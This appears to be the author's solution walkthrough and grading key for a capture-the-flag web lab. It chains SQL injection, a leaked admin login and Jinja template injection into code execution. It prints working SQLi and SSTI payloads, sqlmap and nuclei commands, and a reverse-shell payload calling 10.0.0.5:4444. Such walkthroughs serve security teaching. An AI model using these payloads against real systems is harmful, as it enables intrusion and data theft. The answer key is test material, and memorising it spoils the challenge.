# Stielvoll — Intended Solution (Stage 1)

Author reference. Three chained vulnerabilities: SQLi → admin login →
insecure upload + SSTI → RCE → user flag.

---

## Step 1 — SQL injection in the comment search

Open any project post, e.g. `/projekte/poolbau-mit-holzdeck`, scroll to
**Kommentare durchsuchen**. The search term is sent as the GET parameter `q`
and concatenated straight into a `SELECT` whose rows are shown back on the
page:

```sql
SELECT name, text, created_at FROM comments
WHERE project_slug = '<slug>' AND text LIKE '%<q>%' ORDER BY id
```

The query returns **3 columns**, so a UNION pulls the `users` table into the
results. Enter this in the search box (or as `?q=`):

```
%' UNION SELECT username, password, role FROM users-- -
```

The results list then shows:

```
tom-admin   (text column: @ndAouGot1t!)
```

Useful variants:

```
%' UNION SELECT name, sql, type FROM sqlite_master WHERE type='table'-- -   # schema
%' UNION SELECT sqlite_version(), '', ''-- -                                 # version
x%' OR '1'='1-- -                                                            # boolean true
```

Verbose DB errors are shown on purpose to help tune payloads.

> Why it works: `… text LIKE '%<q>%'` is built by string interpolation.
> `%' UNION SELECT …-- -` closes the `LIKE` string, appends a UNION with a
> matching column count, and comments out the trailing `%'`.

### With sqlmap

This sink is reflected and GET-based, so sqlmap detects it (UNION / boolean;
SQLite has no `SLEEP`, so skip time-based):

```bash
sqlmap -u "http://192.168.1.139:5015/projekte/poolbau-mit-holzdeck?q=test" \
       -p q --dbms=sqlite --technique=UB --batch

# then dump the credentials
sqlmap -u "http://192.168.1.139:5015/projekte/poolbau-mit-holzdeck?q=test" \
       -p q --dbms=sqlite --technique=UB --batch -T users --dump
```

> Note: the comment **POST** form is parameterised (safe) by design — the only
> SQL injection is the `q` search parameter, so sqlmap won't flood the comments
> table with stored payloads.

---

## Step 2 — Admin login

Go to `/admin` (linked as *Administration* in the footer). Log in with the
leaked credentials:

```
Benutzername: tom-admin
Passwort:     @ndAouGot1t!
```

(The login query itself is parameterised — you are meant to *have* the creds,
not bypass the form.)

---

## Step 3 — SSTI → RCE

The admin area renders beitrag content through Jinja's
`render_template_string`. There are two ways to hit it; both run as the web
user (meant to be `analyst`).

### 3a — Reflected preview (scanner-detectable)

`/admin/preview?content=…` renders the parameter and reflects it in the same
response — a classic single-request SSTI. Confirm with:

```
/admin/preview?content={{7*7}}      → prints 49
```

Then get code execution directly:

```
/admin/preview?content={{ cycler.__init__.__globals__.os.popen('cat /home/analyst/user.txt').read() }}
```

**Detecting it with a scanner.** It sits behind the admin login, so point the
scanner at it *with the session cookie* you got in Step 2 (copy `session=…`
from your browser's devtools / the login response):

```bash
nuclei -u "http://192.168.1.139:5015/admin/preview?content=FUZZ" \
       -H "Cookie: session=<your-admin-session-cookie>" \
       -t http/vulnerabilities/ -tags ssti
```

nuclei's SSTI templates inject `{{7*7}}`-style payloads into `content` and
flag the reflected `49`.

### 3b — Stored upload (persistent variant)

"Blogbeitrag erstellen" has a **Titelbild** upload with no type/content
validation. When the post is opened, the uploaded file's bytes are rendered as
a template — so upload a "picture" that is actually a Jinja payload. This path
is multi-step and authenticated, so off-the-shelf scanners won't find it; it's
the manual/persistent route.

Create a file `exploit.png` containing:

```jinja
{{ cycler.__init__.__globals__.os.popen('cat /home/analyst/user.txt').read() }}
```

Fill in a title + text, attach `exploit.png`, publish. Then open the post
(`/blog/<id>`, also listed on `/projekte`). The widget output area prints the
command result — the **user flag**.

Interactive / reverse shell variant:

```jinja
{{ cycler.__init__.__globals__.os.popen('id; uname -a').read() }}
```

```jinja
{{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"').read() }}
```

Because the app is meant to run **as `analyst`**, the shell lands as the
foothold user.

---

## Step 4 — Flag & pivot

```
cat /home/analyst/user.txt     # → CWHS2026{rooted_like_a_begonia}
```

From the `analyst` foothold, local privilege-escalation to the root/second
flag (`/root/root.txt`) is "out of scope of this webpage" and up to the
challenge design (sudo misconfig, SUID, cron, etc.).

---

## The three planted bugs (for grading)

| # | Vulnerability            | Location in `app.py`                     |
|---|--------------------------|------------------------------------------|
| 1 | SQL injection            | `projects_detail` — f-string `SELECT` on `?q=` search |
| 2 | Insecure file upload     | `admin_dashboard` — no upload validation |
| 3 | SSTI → RCE               | `admin_preview` — reflected `render_template_string` (scanner-detectable); `blog_post` — stored, via uploaded file |
